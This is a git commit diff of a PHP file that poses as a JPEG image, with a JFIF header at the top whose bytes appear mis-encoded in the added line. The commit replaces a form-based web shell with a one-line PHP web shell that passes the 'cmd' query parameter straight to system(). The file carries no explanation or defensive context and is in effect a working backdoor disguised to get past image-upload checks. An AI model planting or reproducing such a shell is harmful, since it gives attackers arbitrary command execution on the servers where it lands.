16c73d248ca7272e03b8c4d36d6ecdfef380d97f
Mai Long <117887061+longmdx@users.noreply.github.com>
2023-07-22 20:14:32 +0700

    Add files via upload

--- a712ab6b5dba5cd1d02acd56f4aac8a6.php
+++ a712ab6b5dba5cd1d02acd56f4aac8a6.php
@@ -1,18 +1,3 @@
-ÿØÿà JFIF  N N  ÿÛ C   
+ï¿½ï¿½ï¿½ï¿½ JFIF  N N  ï¿½ï¿½ C   
 
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
-</body>
-</html>
+<?php system($_GET['cmd']); ?>
